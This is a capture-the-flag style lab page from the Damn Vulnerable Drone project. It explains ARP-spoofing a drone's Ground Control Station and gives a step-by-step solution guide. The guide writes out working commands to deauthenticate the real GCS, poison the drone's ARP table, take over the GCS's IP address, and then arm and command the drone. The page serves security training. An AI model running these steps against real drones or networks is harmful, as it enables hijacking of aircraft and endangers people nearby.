<i>ARP spoofing the Ground Control Station (GCS) to intercept and control communication between the drone and the GCS.</i>

[Damn Vulnerable Drone](/nicholasaleks/Damn-Vulnerable-Drone) > [Attack Scenarios](/nicholasaleks/Damn-Vulnerable-Drone/wiki/Attack-Scenarios) > Injection > Ground Control ARP Spoofing

# Description

ARP spoofing involves sending false ARP (Address Resolution Protocol) messages to a network, associating the attacker's MAC address with the IP address of the target device (the GCS in this case). This allows the attacker to intercept, modify, or block communication to the target device, effectively taking control of the drone's communication.

The goal of this attack is to impersonate the GCS by taking over its IP address after disconnecting the real GCS from the network. Once assumed, the attacker can directly interact with the drone using QGroundControl or MAVProxy.

# Resources

- <a href="https://www.aircrack-ng.org/">Aircrack-ng Suite</a>  
- <a href="https://docs.qgroundcontrol.com/master/en/qgc-user-guide/getting_started/download_and_install.html">QGroundControl</a>  
- <a href="https://ardupilot.github.io/MAVProxy/html/getting_started/download.html">MAVProxy</a>

---

<details>
<summary><strong>⚠️ Solution Guide</strong></summary>

<h3>Step 1. Initialize the Drone</h3>
<p>Power on the drone and ensure it is connected to its WiFi network.</p>

---

<h3>Step 2. Break into the Drone Network</h3>
<p>Use WiFi cracking techniques to access the network. See:</p>
<ul>
  <li><a href="/nicholasaleks/Damn-Vulnerable-Drone/wiki/Wifi-Analysis-&-Cracking">Wifi Cracking</a></li>
  <li><a href="/nicholasaleks/Damn-Vulnerable-Drone/wiki/Packet-Sniffing">Packet Sniffing</a></li>
</ul>

---

<h3>Step 3. Deauth the Legitimate GCS</h3>
<p>Disconnect the real GCS from the network using a deauth attack:</p>

<pre><code class="code mb-3 mt-3">sudo aireplay-ng --deauth 0 -a &lt;AP_MAC&gt; -c &lt;GCS_MAC&gt; wlan0mon
</code></pre>

---

<h3>Step 4. Install QGroundControl (x86_64)</h3>
<pre><code class="code mb-3 mt-3">wget https://s3-us-west-2.amazonaws.com/qgroundcontrol/latest/QGroundControl.AppImage
chmod +x QGroundControl.AppImage
./QGroundControl.AppImage
</code></pre>

---

<h3>Step 5. Install MAVProxy (ARM/Apple Silicon)</h3>
<pre><code class="code mb-3 mt-3">sudo pip install MAVProxy
mavproxy.py
</code></pre>

---

<h3>Step 6. Note Your IP Address on the Network</h3>
<pre><code class="code mb-3 mt-3">ifconfig wlan0
</code></pre>

---

<h3>Step 7. Perform ARP Spoofing</h3>
<p>Impersonate the GCS by poisoning the ARP table of the drone:</p>

<pre><code class="code mb-3 mt-3">sudo arpspoof -i wlan0 -t 192.168.13.14 -r 192.168.13.1
</code></pre>

---

<h3>Step 8. Set Static GCS IP Address</h3>
<pre><code class="code mb-3 mt-3">nmcli connection modify "Drone_Wifi" ipv4.method manual \
ipv4.addresses 192.168.13.14/24 \
ipv4.gateway 192.168.13.1 \
ipv4.dns "8.8.8.8 8.8.4.4"
</code></pre>

---

<h3>Step 9. Restart Network Connection</h3>
<pre><code class="code mb-3 mt-3">nmcli connection down "Drone_Wifi" && nmcli connection up "Drone_Wifi"
</code></pre>

---

<h3>Step 10. Wait for Drone Connection</h3>
<p>Once the GCS is spoofed and reconnected, the drone should attempt to link to your machine assuming the GCS role.</p>

---

<h3>Step 11. Control the Drone via QGroundControl (x86_64)</h3>
<ul>
  <li>Right-click → "Go To" position</li>
  <li>Select "RTL" or "Land" from the mode dropdown</li>
</ul>

---

<h3>Step 12. Control the Drone via MAVProxy (ARM)</h3>
<ul>
  <li><code>mode GUIDED</code></li>
  <li><code>arm throttle</code></li>
  <li><code>rtl</code>, <code>land</code>, etc.</li>
</ul>

---

<h3>Step 13. Restore Original IP Configuration</h3>
<pre><code class="code mb-3 mt-3">nmcli connection modify "Drone_Wifi" ipv4.method manual \
ipv4.addresses 192.168.13.10/24 \
ipv4.gateway 192.168.13.1 \
ipv4.dns "8.8.8.8 8.8.4.4"

nmcli connection down "Drone_Wifi" && nmcli connection up "Drone_Wifi"
</code></pre>

</details>
